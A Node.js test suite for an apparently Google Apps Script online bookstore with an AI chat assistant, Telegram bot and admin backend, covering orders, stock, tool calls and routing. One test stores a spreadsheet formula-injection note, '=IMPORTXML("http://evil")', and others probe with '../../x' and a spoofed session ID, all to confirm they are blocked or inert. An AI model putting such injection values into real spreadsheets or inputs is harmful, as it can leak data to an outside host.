/**
 * 測試入口：node tests/run.cjs
 *
 * 把全部 .gs 載進 Node（GAS 服務用 tests/gas-mock.cjs 模擬），跑業務規則與路由的測試。
 * pre-push hook 會在 clasp push / deploy 之前執行它，失敗就不部署。
 *
 * 不會打真的 NVIDIA / Telegram：LLM 的回應由每個案例自己排好（g.__http.nvidiaQueue），
 * 測的是「我們怎麼處理模型的回應」，不是模型本身的品質 —— 那個用 DevTools.testNvidia 實測。
 */
const assert = require('assert');
const { createGas } = require('./gas-mock.cjs');

const tests = [];
const test = (name, fn) => tests.push({ name, fn });

/** 一套全新、已建表、已灌範例資料的環境 */
function fresh(extraProps) {
  const g = createGas({ props: Object.assign({ TELEGRAM_API_KEY: 'tg-test', NVIDIA_API_KEY: 'nv-test', ADMIN_PASSWORD: 'secret' }, extraProps || {}) });
  g.setupSheets();
  g.seedSampleData();
  return g;
}
const stockOf = (g, id) => g.Store.getProduct(id).stock;
const rows = (g, name) => g.DB.all(name);
const text = (content) => ({ message: { role: 'assistant', content } });
const toolCall = (name, args, id) => ({
  message: { role: 'assistant', content: '', tool_calls: [{ id: id || 'call_1', type: 'function', function: { name, arguments: JSON.stringify(args) } }] }
});
const tgUpdate = (id, chatId, txt) => ({
  update_id: id,
  message: { message_id: id, chat: { id: chatId, type: 'private' }, from: { id: chatId, first_name: '王', last_name: '小明' }, text: txt }
});
const post = (g, body) => {
  const out = g.doPost({ postData: { contents: JSON.stringify(body) } });
  if (out === undefined) return undefined;
  try { return JSON.parse(out.getContent()); } catch (e) { return out.getContent(); }
};
const order = (over) => Object.assign({
  items: [{ product_id: 'B001', qty: 1 }], customer_name: '王小明', phone: '0912-345-678',
  address: '台北市中正區書香路 1 號', payment: '轉帳', channel: 'web', session_id: 'WEB:abc12345'
}, over || {});

// ─── 建表與資料 ─────────────────────────────────────────────────

test('setupSheets 沒有 SHEET_ID 時自動建立試算表並寫回屬性', () => {
  const g = createGas({ props: {} });
  g.setupSheets();
  assert.ok(g.__props.SHEET_ID, '應寫入 SHEET_ID');
  const ss = g.__spreadsheets[g.__props.SHEET_ID];
  Object.keys(g.DB.SCHEMA).forEach(n => assert.ok(ss.getSheetByName(n), '缺分頁 ' + n));
  assert.strictEqual(ss.getSheetByName('工作表1'), null, '預設空白分頁應被刪除');
});

test('setupSheets 重跑不會清掉既有資料', () => {
  const g = fresh();
  g.setupSheets();
  assert.strictEqual(g.Store.listProducts(true).length, 12);
});

test('範例資料：12 本書、搜尋與分類', () => {
  const g = fresh();
  assert.strictEqual(g.Store.listProducts(false).length, 12);
  assert.strictEqual(g.Store.searchProducts('推理').length, 2);
  assert.strictEqual(g.Store.searchProducts('沈默言 霧港').length, 1);
  assert.strictEqual(g.Store.searchProducts('', '兒童').length, 2);
  assert.ok(g.Store.categories().indexOf('科幻') >= 0);
});

test('下架的書不出現在商店，也不能下單', () => {
  const g = fresh();
  g.Store.updateProduct('B001', { active: false });
  assert.strictEqual(g.Store.listProducts(false).length, 11);
  const r = g.Store.createOrder(order());
  assert.strictEqual(r.ok, false);
});

// ─── 下單 ───────────────────────────────────────────────────────

test('下單成功：扣庫存、寫明細、未滿免運門檻收運費、轉帳為待付款', () => {
  const g = fresh();
  const before = stockOf(g, 'B001');
  const r = g.Store.createOrder(order({ items: [{ product_id: 'B001', qty: 2 }] }));
  assert.ok(r.ok, r.error);
  assert.strictEqual(stockOf(g, 'B001'), before - 2);
  assert.strictEqual(r.order.subtotal, 760);
  assert.strictEqual(r.order.shipping, 60);
  assert.strictEqual(r.order.total, 820);
  assert.strictEqual(r.order.status, '待付款');
  assert.strictEqual(r.order.phone, '0912345678', '電話應正規化為純數字');
  assert.match(r.order.order_id, /^BK\d{12}$/);
  assert.strictEqual(rows(g, 'order_items').length, 1);
});

test('滿 1000 免運；貨到付款直接待出貨；同一本書分兩行會合併', () => {
  const g = fresh();
  const r = g.Store.createOrder(order({
    items: [{ product_id: 'B012', qty: 1 }, { product_id: 'B011', qty: 1 }, { product_id: 'B012', qty: 1 }],
    payment: '貨到付款'
  }));
  assert.ok(r.ok, r.error);
  assert.strictEqual(r.order.subtotal, 620 * 2 + 580);
  assert.strictEqual(r.order.shipping, 0);
  assert.strictEqual(r.order.status, '待出貨');
  assert.strictEqual(r.order.items.length, 2);
});

test('庫存不足整張單拒絕，其他書的庫存也不能被扣', () => {
  const g = fresh();
  const b1 = stockOf(g, 'B001');
  const r = g.Store.createOrder(order({ items: [{ product_id: 'B001', qty: 1 }, { product_id: 'B004', qty: 1 }] }));
  assert.strictEqual(r.ok, false);
  assert.match(r.error, /庫存不足/);
  assert.strictEqual(stockOf(g, 'B001'), b1);
  assert.strictEqual(rows(g, 'orders').length, 0);
});

test('Sheet 自動轉型：電話保留開頭 0、時間是台北時間字串、客人輸入的公式不會被執行', () => {
  const g = fresh();
  const r = g.Store.createOrder(order({ phone: '0900000000', note: '=IMPORTXML("http://evil")' }));
  const o = g.Store.getOrder(r.order.order_id);
  assert.strictEqual(o.phone, '0900000000');
  assert.match(String(o.created_at), /^\d{4}\/\d{2}\/\d{2} \d{2}:\d{2}:\d{2}$/);
  assert.strictEqual(o.note, '=IMPORTXML("http://evil")');
  assert.strictEqual(typeof o.note, 'string');
  // 後台「今日訂單」靠 created_at 字串比對日期
  const token = post(g, { source: 'web', action: 'login', password: 'secret' }).token;
  assert.strictEqual(post(g, { source: 'web', action: 'dashboard', token }).stats.todayOrders, 1);
  // 取消後回補也要能找到這張單
  assert.ok(g.Store.cancelOrder(r.order.order_id, '0900000000').ok);
});

test('下單欄位驗證', () => {
  const g = fresh();
  [
    [{ items: [] }, /購物車/],
    [{ customer_name: ' ' }, /姓名/],
    [{ phone: '123' }, /電話/],
    [{ address: '' }, /地址/],
    [{ payment: '信用卡' }, /付款方式/],
    [{ items: [{ product_id: 'B001', qty: 0 }] }, /數量/],
    [{ items: [{ product_id: 'B001', qty: 100 }] }, /數量/],
    [{ items: [{ product_id: 'NOPE', qty: 1 }] }, /找不到/]
  ].forEach(([over, re]) => {
    const r = g.Store.createOrder(order(over));
    assert.strictEqual(r.ok, false, JSON.stringify(over));
    assert.match(r.error, re);
  });
});

// ─── 查單、取消、狀態 ────────────────────────────────────────────

test('查單：電話不符拒絕；同一個 session 免電話', () => {
  const g = fresh();
  const id = g.Store.createOrder(order()).order.order_id;
  assert.strictEqual(g.Store.lookupOrder(id, '0999999999', '').ok, false);
  assert.strictEqual(g.Store.lookupOrder(id, '', 'WEB:someoneelse').ok, false);
  assert.strictEqual(g.Store.lookupOrder(id, '0912345678', '').ok, true);
  assert.strictEqual(g.Store.lookupOrder(id.toLowerCase(), '0912 345 678', '').ok, true, '編號大小寫、電話空白都要容忍');
  assert.strictEqual(g.Store.lookupOrder(id, '', 'WEB:abc12345').ok, true);
  assert.strictEqual(g.Store.lookupOrder('BK000000000000', '0912345678', '').ok, false);
});

test('取消訂單回補庫存；不能重複取消；已出貨不能取消', () => {
  const g = fresh();
  const before = stockOf(g, 'B001');
  const id = g.Store.createOrder(order()).order.order_id;
  const c = g.Store.cancelOrder(id, '0912345678');
  assert.ok(c.ok, c.error);
  assert.strictEqual(stockOf(g, 'B001'), before);
  assert.strictEqual(g.Store.cancelOrder(id, '0912345678').ok, false);

  const id2 = g.Store.createOrder(order()).order.order_id;
  g.Store.setOrderStatus(id2, '已出貨');
  const c2 = g.Store.cancelOrder(id2, '0912345678');
  assert.strictEqual(c2.ok, false);
  assert.match(c2.error, /已出貨/);
});

test('後台把已取消改回待出貨會重新扣庫存；庫存不夠時擋下', () => {
  const g = fresh();
  const id = g.Store.createOrder(order({ items: [{ product_id: 'B002', qty: 5 }] })).order.order_id;
  assert.strictEqual(stockOf(g, 'B002'), 0);
  g.Store.setOrderStatus(id, '已取消');
  assert.strictEqual(stockOf(g, 'B002'), 5);
  g.Store.updateProduct('B002', { stock: 3 });
  assert.strictEqual(g.Store.setOrderStatus(id, '待出貨').ok, false);
  g.Store.updateProduct('B002', { stock: 6 });
  assert.ok(g.Store.setOrderStatus(id, '待出貨').ok);
  assert.strictEqual(stockOf(g, 'B002'), 1);
  assert.strictEqual(g.Store.setOrderStatus(id, '亂寫').ok, false);
});

test('後台改商品：驗證價格與庫存', () => {
  const g = fresh();
  assert.strictEqual(g.Store.updateProduct('B001', { stock: -1 }).ok, false);
  assert.strictEqual(g.Store.updateProduct('B001', { stock: 1.5 }).ok, false);
  assert.strictEqual(g.Store.updateProduct('B001', { price: 'abc' }).ok, false);
  assert.ok(g.Store.updateProduct('B001', { price: '399', stock: '7', active: 'TRUE' }).ok);
  const p = g.Store.getProduct('B001');
  assert.strictEqual(p.price, 399);
  assert.strictEqual(p.stock, 7);
  assert.strictEqual(g.Store.updateProduct('NOPE', { stock: 1 }).ok, false);
});

// ─── 工具 ───────────────────────────────────────────────────────

test('每個工具定義都有對應的實作（definitions 與 switch 同步）', () => {
  const g = fresh();
  g.Conversation.ensureSession('WEB:tooltest1', '');
  g.Tools.definitions().forEach(d => {
    const r = g.Tools.execute(d.function.name, {}, { sessionId: 'WEB:tooltest1', channel: 'webchat' });
    assert.ok(!(r.error || '').startsWith('未知的工具'), d.function.name + ' 沒有實作');
  });
});

test('search_products 把分類名當關鍵字也找得到', () => {
  const g = fresh();
  const r = g.Tools.execute('search_products', { keyword: '商業理財' }, { sessionId: 'WEB:x1234567', channel: 'webchat' });
  assert.strictEqual(r.count, 2);
});

test('create_order 工具的 session 由系統注入，模型給的參數蓋不掉', () => {
  const g = fresh();
  const r = g.Tools.execute('create_order', {
    items: [{ product_id: 'B003', title: '午後的貓與咖啡', qty: 1 }], customer_name: '林', phone: '0911222333',
    address: '高雄', payment: '貨到付款', session_id: 'WEB:hacker', channel: 'web'
  }, { sessionId: 'TG:42', channel: 'telegram' });
  assert.ok(r.ok, r.error);
  const o = rows(g, 'orders')[0];
  assert.strictEqual(o.session_id, 'TG:42');
  assert.strictEqual(o.channel, 'telegram');
});

test('create_order：編號與書名不符就拒絕，不會訂出別本書（2026/11/22 實際發生過）', () => {
  const g = fresh();
  const ctx = { sessionId: 'TG:42', channel: 'telegram' };
  const base = { customer_name: '江', phone: '0900111222', address: '北投', payment: '貨到付款' };
  const wrong = g.Tools.execute('create_order', Object.assign({ items: [{ product_id: 'B001', title: '星海拓荒者', qty: 1 }] }, base), ctx);
  assert.strictEqual(wrong.ok, false);
  assert.match(wrong.error, /B001 是《霧港謀殺案》/);
  const noTitle = g.Tools.execute('create_order', Object.assign({ items: [{ product_id: 'B005', qty: 1 }] }, base), ctx);
  assert.strictEqual(noTitle.ok, false);
  const ghost = g.Tools.execute('create_order', Object.assign({ items: [{ product_id: 'B999', title: '不存在', qty: 1 }] }, base), ctx);
  assert.strictEqual(ghost.ok, false);
  assert.strictEqual(rows(g, 'orders').length, 0, '以上都不該成立訂單');
  // 書名帶書名號、少打幾個字都可以
  const ok1 = g.Tools.execute('create_order', Object.assign({ items: [{ product_id: 'B005', title: '《星海拓荒者》', qty: 1 }] }, base), ctx);
  assert.ok(ok1.ok, ok1.error);
  const ok2 = g.Tools.execute('create_order', Object.assign({ items: [{ product_id: 'B006', title: '演算法', qty: 1 }] }, base), ctx);
  assert.ok(ok2.ok, ok2.error);
});

test('店家通知都有【店家通知】開頭；客人就是通知頻道本人時，真人模式訊息不重複轉給自己', () => {
  const g = fresh({ ADMIN_CHAT_ID: '968' });
  g.ChatBot.handle('TG:968', '/human', '老闆自己');
  g.__http.telegram.length = 0;
  g.ChatBot.handle('TG:968', '確認一下那本書取消了嗎', '老闆自己');
  assert.strictEqual(g.__http.telegram.length, 0, '不該把自己的話轉回給自己');

  g.ChatBot.handle('TG:123', '/human', '別的客人');
  g.ChatBot.handle('TG:123', '我的書破了', '別的客人');
  const toAdmin = g.__http.telegram.filter(t => t.payload.chat_id === '968').map(t => t.payload.text);
  assert.ok(toAdmin.length >= 2);
  toAdmin.forEach(t => assert.ok(t.startsWith('【店家通知】'), t));
});

// ─── ChatBot ────────────────────────────────────────────────────

test('ChatBot：AI 先叫工具再回答，工具結果有回傳給模型，對話寫進 chat', () => {
  const g = fresh();
  let secondPayload = null;
  g.__http.nvidiaQueue.push(toolCall('search_products', { keyword: '推理' }));
  g.__http.nvidiaQueue.push(p => { secondPayload = p; return text('有兩本推理小說：**霧港謀殺案** 與 第十三號房客。'); });

  const reply = g.ChatBot.handle('WEB:visitor001', '有推理小說嗎', '訪客');
  assert.strictEqual(reply, '有兩本推理小說：霧港謀殺案 與 第十三號房客。', 'Markdown 應被移除');
  const toolMsg = secondPayload.messages.find(m => m.role === 'tool');
  assert.ok(toolMsg, '第二輪應帶 tool 訊息');
  assert.strictEqual(JSON.parse(toolMsg.content).count, 2);
  assert.strictEqual(secondPayload.messages[0].role, 'system');
  const chat = rows(g, 'chat').map(r => r.role);
  assert.deepStrictEqual(chat, ['user', 'assistant']);
});

test('ChatBot：歷史對話會帶進下一次請求，且這次的訊息不重複', () => {
  const g = fresh();
  g.__http.nvidiaQueue.push(text('您好！'));
  g.ChatBot.handle('WEB:visitor002', '哈囉', '');
  let payload = null;
  g.__http.nvidiaQueue.push(p => { payload = p; return text('好的'); });
  g.ChatBot.handle('WEB:visitor002', '我想買書', '');
  const roles = payload.messages.map(m => m.role + ':' + (m.content || ''));
  assert.deepStrictEqual(roles.slice(1), ['user:哈囉', 'assistant:您好！', 'user:我想買書']);
});

test('ChatBot：最後一輪不帶工具，逼模型收斂成文字', () => {
  const g = fresh();
  const payloads = [];
  for (let i = 0; i < g.Config.TOOL_MAX_ITERATIONS - 1; i++) {
    g.__http.nvidiaQueue.push(p => { payloads.push(p); return toolCall('search_products', {}); });
  }
  g.__http.nvidiaQueue.push(p => { payloads.push(p); return text('最後的回答'); });
  assert.strictEqual(g.ChatBot.handle('WEB:visitor003', '隨便', ''), '最後的回答');
  assert.ok(payloads[0].tools);
  assert.strictEqual(payloads[payloads.length - 1].tools, undefined);
});

test('ChatBot：模型完全失敗時回固定的道歉訊息，不會丟例外', () => {
  const g = fresh();
  g.__http.nvidiaQueue.push({ code: 400, body: { error: 'bad' } });
  g.__http.nvidiaQueue.push({ code: 400, body: { error: 'bad' } }); // 備援也失敗
  const reply = g.ChatBot.handle('WEB:visitor004', '在嗎', '');
  assert.match(reply, /系統忙碌/);
});

test('NvidiaService：主模型 404 時改用備援模型', () => {
  const g = fresh();
  const models = [];
  g.__http.nvidiaQueue.push(p => { models.push(p.model); return { code: 404, body: {} }; });
  g.__http.nvidiaQueue.push(p => { models.push(p.model); return text('備援回答'); });
  const r = g.NvidiaService.chat([{ role: 'user', content: 'hi' }], {});
  assert.strictEqual(r.message.content, '備援回答');
  assert.deepStrictEqual(models, [g.Config.NVIDIA_MODEL, g.Config.NVIDIA_FALLBACK_MODEL]);
});

test('模型可用 Script Property 覆寫', () => {
  const g = fresh({ NVIDIA_MODEL: 'x/main', NVIDIA_FALLBACK_MODEL: 'x/fb' });
  let model = null;
  g.__http.nvidiaQueue.push(p => { model = p.model; return text('ok'); });
  g.NvidiaService.chat([{ role: 'user', content: 'hi' }], {});
  assert.strictEqual(model, 'x/main');
  assert.strictEqual(g.Config.NVIDIA_FALLBACK_MODEL, 'x/fb');
});

test('NvidiaService：清掉 <think> 區塊；gemma 不送 tool_choice、gpt-oss 備援送 reasoning_effort', () => {
  const g = fresh({ NVIDIA_MODEL: 'google/gemma-4-31b-it', NVIDIA_FALLBACK_MODEL: 'openai/gpt-oss-20b' });
  let p1 = null;
  g.__http.nvidiaQueue.push(p => { p1 = p; return text('<think>想一下</think>答案'); });
  const r = g.NvidiaService.chat([{ role: 'user', content: 'hi' }], { tools: g.Tools.definitions() });
  assert.strictEqual(r.message.content, '答案');
  assert.strictEqual(p1.tool_choice, undefined);
  let p2 = null;
  g.__http.nvidiaQueue.push({ code: 410, body: {} });
  g.__http.nvidiaQueue.push(p => { p2 = p; return text('ok'); });
  g.NvidiaService.chat([{ role: 'user', content: 'hi' }], { tools: g.Tools.definitions() });
  assert.strictEqual(p2.reasoning_effort, 'low');
  assert.strictEqual(p2.tool_choice, 'auto');
});

test('NvidiaService：503 會重試', () => {
  const g = fresh();
  g.__http.nvidiaQueue.push({ code: 503, body: {} });
  g.__http.nvidiaQueue.push(text('第二次成功'));
  assert.strictEqual(g.NvidiaService.chat([{ role: 'user', content: 'hi' }], {}).message.content, '第二次成功');
});

test('stripMarkdown：粗體、斜體、標題、清單符號都清掉', () => {
  const g = fresh();
  assert.strictEqual(g.Utils.stripMarkdown('**粗體** 與 *斜體簡介*'), '粗體 與 斜體簡介');
  assert.strictEqual(g.Utils.stripMarkdown('## 標題\n- 項目'), '標題\n・項目');
  assert.strictEqual(g.Utils.stripMarkdown('3 * 4 = 12'), '3 * 4 = 12');
});

test('斜線指令不花 LLM 配額', () => {
  const g = fresh();
  const r = g.ChatBot.handle('TG:1', '/books', '');
  assert.match(r, /霧港謀殺案/);
  assert.match(r, /把日子過成詩.*缺貨/);
  assert.strictEqual(g.__http.calls.filter(c => c.url.indexOf('nvidia') >= 0).length, 0);
});

test('轉真人：/human 之後 AI 不回覆、通知店家；/ai 改回', () => {
  const g = fresh({ ADMIN_CHAT_ID: '999' });
  g.ChatBot.handle('TG:5', '/human', '小明');
  assert.strictEqual(g.Conversation.getSession('TG:5').mode, 'human');
  const r = g.ChatBot.handle('TG:5', '我的書破了', '小明');
  assert.strictEqual(r, null);
  assert.strictEqual(g.__http.calls.filter(c => c.url.indexOf('nvidia') >= 0).length, 0);
  const toAdmin = g.__http.telegram.filter(t => t.payload.chat_id === '999').map(t => t.payload.text);
  assert.ok(toAdmin.some(t => /要求真人客服/.test(t)));
  assert.ok(toAdmin.some(t => /我的書破了/.test(t)));
  g.ChatBot.handle('TG:5', '/ai', '小明');
  assert.strictEqual(g.Conversation.getSession('TG:5').mode, 'ai');
});

test('AI 呼叫 request_human 工具會切成真人模式', () => {
  const g = fresh();
  g.__http.nvidiaQueue.push(toolCall('request_human', { reason: '客訴' }));
  g.__http.nvidiaQueue.push(text('已幫您轉接真人客服'));
  g.ChatBot.handle('WEB:visitor005', '我要客訴', '');
  assert.strictEqual(g.Conversation.getSession('WEB:visitor005').mode, 'human');
});

test('頻率限制：超過上限後擋下且不呼叫 LLM', () => {
  const g = fresh();
  for (let i = 0; i < g.Config.RATE_MAX_MSGS; i++) g.ChatBot.handle('TG:7', '/start', '');
  const r = g.ChatBot.handle('TG:7', '/start', '');
  assert.match(r, /稍等/);
});

// ─── doPost 路由 ────────────────────────────────────────────────

test('doPost：Telegram update → ChatBot → sendMessage 回給同一個 chat', () => {
  const g = fresh();
  g.__http.nvidiaQueue.push(text('歡迎光臨！'));
  const out = g.doPost({ postData: { contents: JSON.stringify(tgUpdate(1001, 555, '你好')) } });
  assert.strictEqual(out, undefined, 'Telegram 路徑不可回 ContentService（會變 302，Telegram 會一直重送）');
  const sent = g.__http.telegram.filter(t => t.method === 'sendMessage');
  assert.strictEqual(sent.length, 1);
  assert.strictEqual(sent[0].payload.chat_id, '555');
  assert.strictEqual(sent[0].payload.text, '歡迎光臨！');
  assert.strictEqual(g.Conversation.getSession('TG:555').display_name, '王 小明');
});

test('doPost：重複的 Telegram update 只處理一次', () => {
  const g = fresh();
  g.__http.nvidiaQueue.push(text('回覆'));
  post(g, tgUpdate(2002, 556, '你好'));
  post(g, tgUpdate(2002, 556, '你好'));
  assert.strictEqual(g.__http.telegram.filter(t => t.method === 'sendMessage').length, 1);
});

test('doPost：非文字訊息（貼圖等）忽略', () => {
  const g = fresh();
  post(g, { update_id: 3003, message: { message_id: 1, chat: { id: 1 }, from: { id: 1 }, sticker: {} } });
  assert.strictEqual(g.__http.telegram.length, 0);
});

test('doPost：/admin 密碼正確才綁定店家通知頻道，之後新訂單會推播', () => {
  const g = fresh();
  post(g, tgUpdate(4001, 777, '/admin wrong'));
  assert.strictEqual(g.__props.ADMIN_CHAT_ID, undefined);
  post(g, tgUpdate(4002, 777, '/admin secret'));
  assert.strictEqual(g.__props.ADMIN_CHAT_ID, '777');
  assert.strictEqual(rows(g, 'chat').length, 0, '/admin 不應寫進客服對話');
  g.__http.telegram.length = 0;
  g.Store.createOrder(order());
  assert.ok(g.__http.telegram.some(t => t.payload.chat_id === '777' && /新訂單/.test(t.payload.text)));
});

test('doPost：網頁 POST（source=web）走 WebApi 並回 JSON', () => {
  const g = fresh();
  const r = post(g, { source: 'web', action: 'shopInfo' });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.products.length, 12);
  assert.strictEqual(r.shop.name, '拾頁書店');
});

test('doPost：無法辨識的 POST 回錯誤，不會丟例外', () => {
  const g = fresh();
  assert.strictEqual(post(g, { hello: 1 }).ok, false);
  const out = g.doPost({ postData: { contents: 'not json' } });
  assert.strictEqual(JSON.parse(out.getContent()).ok, false);
  assert.strictEqual(JSON.parse(g.doPost(undefined).getContent()).ok, false);
});

test('網頁下單 → 我的訂單 → 查單 → 對話框問 AI', () => {
  const g = fresh();
  const vid = 'visitorABC123';
  const c = post(g, { source: 'web', action: 'createOrder', visitorId: vid, items: [{ product_id: 'B007', qty: 1 }],
    customer_name: '陳', phone: '0922333444', address: '台中', payment: '轉帳' });
  assert.ok(c.ok, c.error);
  assert.strictEqual(post(g, { source: 'web', action: 'myOrders', visitorId: vid }).orders.length, 1);
  assert.strictEqual(post(g, { source: 'web', action: 'lookupOrder', order_id: c.order.order_id, phone: '0922333444' }).ok, true);
  assert.strictEqual(post(g, { source: 'web', action: 'lookupOrder', order_id: c.order.order_id, phone: '0900000000' }).ok, false);

  g.__http.nvidiaQueue.push(toolCall('list_my_orders', {}));
  g.__http.nvidiaQueue.push(text('您有一張待付款的訂單'));
  const chat = post(g, { source: 'web', action: 'chat', visitorId: vid, text: '我的訂單呢' });
  assert.strictEqual(chat.reply, '您有一張待付款的訂單');
  assert.strictEqual(chat.mode, 'ai');
  assert.strictEqual(post(g, { source: 'web', action: 'chatHistory', visitorId: vid }).messages.length, 2);
});

test('同一個 requestId 重送：下單只成立一張、對話只處理一次', () => {
  const g = fresh();
  const req = { source: 'web', action: 'createOrder', requestId: 'req_abc12345', visitorId: 'visitorDup001',
    items: [{ product_id: 'B001', qty: 1 }], customer_name: '陳', phone: '0922333444', address: '台中', payment: '轉帳' };
  const a = post(g, req);
  const b = post(g, req);
  assert.ok(a.ok);
  assert.strictEqual(b.order.order_id, a.order.order_id);
  assert.strictEqual(rows(g, 'orders').length, 1);

  g.__http.nvidiaQueue.push(text('回覆一次'));
  const chat = { source: 'web', action: 'chat', requestId: 'req_chat0001', visitorId: 'visitorDup001', text: '你好' };
  assert.strictEqual(post(g, chat).reply, '回覆一次');
  assert.strictEqual(post(g, chat).reply, '回覆一次'); // 沒排第二個 NVIDIA 回應，重跑的話會丟錯
  assert.strictEqual(rows(g, 'chat').length, 2);
});

test('網頁訪客 ID 格式不對會被擋下', () => {
  const g = fresh();
  const r = post(g, { source: 'web', action: 'chat', visitorId: '../../x', text: 'hi' });
  assert.strictEqual(r.ok, false);
});

// ─── 後台 ───────────────────────────────────────────────────────

test('後台：沒登入一律 AUTH；密碼錯誤拒絕；登入後可用', () => {
  const g = fresh();
  ['dashboard', 'sessions', 'orders', 'products', 'reply', 'setOrderStatus', 'updateProduct'].forEach(a => {
    assert.strictEqual(post(g, { source: 'web', action: a }).error, 'AUTH', a);
    assert.strictEqual(post(g, { source: 'web', action: a, token: 'forged' }).error, 'AUTH', a);
  });
  assert.strictEqual(post(g, { source: 'web', action: 'login', password: 'nope' }).ok, false);
  const login = post(g, { source: 'web', action: 'login', password: 'secret' });
  assert.ok(login.ok);
  const d = post(g, { source: 'web', action: 'dashboard', token: login.token });
  assert.ok(d.ok);
  assert.strictEqual(typeof d.stats.lowStock, 'number');
});

test('後台：沒設 ADMIN_PASSWORD 時無法登入（不能用空密碼進去）', () => {
  const g = fresh({ ADMIN_PASSWORD: '' });
  assert.strictEqual(post(g, { source: 'web', action: 'login', password: '' }).ok, false);
});

test('後台：店員回覆 Telegram 客人會推播，並出現在對話紀錄', () => {
  const g = fresh();
  const token = post(g, { source: 'web', action: 'login', password: 'secret' }).token;
  g.ChatBot.handle('TG:888', '/human', '阿華');
  g.__http.telegram.length = 0;
  const r = post(g, { source: 'web', action: 'reply', token, sessionId: 'TG:888', text: '您好，我來處理' });
  assert.ok(r.ok);
  assert.strictEqual(g.__http.telegram[0].payload.chat_id, '888');
  assert.match(g.__http.telegram[0].payload.text, /真人客服.*您好，我來處理/);
  const m = post(g, { source: 'web', action: 'messages', token, sessionId: 'TG:888' });
  assert.strictEqual(m.messages[m.messages.length - 1].role, 'staff');
  assert.strictEqual(g.Conversation.getSession('TG:888').unread, 0, '打開對話後未讀歸零');
});

test('後台：店員回覆網頁訪客，訪客輪詢 chatHistory 看得到', () => {
  const g = fresh();
  const token = post(g, { source: 'web', action: 'login', password: 'secret' }).token;
  const vid = 'webvisitor99';
  post(g, { source: 'web', action: 'chat', visitorId: vid, text: '/human' });
  post(g, { source: 'web', action: 'reply', token, sessionId: 'WEB:' + vid, text: '請問需要什麼協助？' });
  const h = post(g, { source: 'web', action: 'chatHistory', visitorId: vid });
  assert.strictEqual(h.mode, 'human');
  assert.strictEqual(h.messages[h.messages.length - 1].content, '請問需要什麼協助？');
});

test('後台：訂單列表、改狀態、改庫存', () => {
  const g = fresh();
  const token = post(g, { source: 'web', action: 'login', password: 'secret' }).token;
  const id = g.Store.createOrder(order()).order.order_id;
  const list = post(g, { source: 'web', action: 'orders', token });
  assert.strictEqual(list.orders[0].order_id, id);
  assert.strictEqual(list.orders[0].items[0].title, '霧港謀殺案');
  assert.ok(post(g, { source: 'web', action: 'setOrderStatus', token, order_id: id, status: '已出貨' }).ok);
  assert.ok(post(g, { source: 'web', action: 'updateProduct', token, id: 'B010', changes: { stock: 2 } }).ok);
  assert.strictEqual(stockOf(g, 'B010'), 2);
});

// ─── 頁面與排程 ─────────────────────────────────────────────────

test('doGet：預設商店頁、?page=admin 後台，並注入 API 網址', () => {
  const g = fresh();
  assert.strictEqual(g.doGet({ parameter: {} }).file, 'ShopPage');
  const admin = g.doGet({ parameter: { page: 'admin' } });
  assert.strictEqual(admin.file, 'AdminPage');
  assert.match(admin.vars.apiUrl, /^https:\/\/script\.google\.com\/macros\/s\/.+\/exec$/);
});

test('商店頁 footer 的 bot 名稱：第一次打 getMe，之後讀快取；後台不打', () => {
  const g = fresh();
  assert.strictEqual(g.doGet({ parameter: { page: 'admin' } }).vars.botUsername, '');
  assert.strictEqual(g.__http.telegram.length, 0);
  assert.strictEqual(g.doGet({ parameter: {} }).vars.botUsername, 'shiye_test_bot');
  assert.strictEqual(g.__props.BOT_USERNAME, 'shiye_test_bot');
  g.doGet({ parameter: {} });
  assert.strictEqual(g.__http.telegram.filter(t => t.method === 'getMe').length, 1, '第二次應讀快取');
});

test('沒有 Telegram token 時商店頁照常開，只是沒有 QR 區', () => {
  const g = fresh({ TELEGRAM_API_KEY: '' });
  const page = g.doGet({ parameter: {} });
  assert.strictEqual(page.file, 'ShopPage');
  assert.strictEqual(page.vars.botUsername, '');
});

test('/start 帶 deep link 參數（QR code 的 ?start=web）也認得', () => {
  const g = fresh();
  assert.match(g.ChatBot.handle('TG:31', '/start web', ''), /歡迎光臨/);
});

test('dailyCleanUp 只刪過期的對話', () => {
  const g = fresh();
  g.DB.insert('chat', { timestamp: '2020/01/01 00:00:00', session_id: 'X', role: 'user', content: 'old' });
  g.DB.insert('chat', { timestamp: g.Utils.now(), session_id: 'X', role: 'user', content: 'new' });
  g.dailyCleanUp();
  const left = rows(g, 'chat');
  assert.strictEqual(left.length, 1);
  assert.strictEqual(left[0].content, 'new');
});

test('ShopPage／AdminPage 的 <script> 語法正確', () => {
  const fs = require('fs');
  const path = require('path');
  const vm = require('vm');
  ['ShopPage.html', 'AdminPage.html'].forEach(f => {
    const html = fs.readFileSync(path.join(__dirname, '..', f), 'utf8');
    const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1]);
    assert.ok(scripts.length, f + ' 沒有 script');
    scripts.forEach(s => {
      // 範本標籤在 GAS 端才會被代換，這裡換成合法的 JS 值再編譯
      const js = s.replace(/<\?!?=[\s\S]*?\?>/g, '"x"');
      new vm.Script(js, { filename: f });
    });
  });
});

// ─── 執行 ───────────────────────────────────────────────────────
let failed = 0;
for (const t of tests) {
  try {
    t.fn();
    console.log('  ✓ ' + t.name);
  } catch (e) {
    failed++;
    console.log('  ✗ ' + t.name + '\n      ' + String(e && e.stack || e).split('\n').slice(0, 3).join('\n      '));
  }
}
console.log(failed ? `\n${failed} 項失敗 / 共 ${tests.length} 項` : `\n全部通過（${tests.length} 項）`);
process.exit(failed ? 1 : 0);
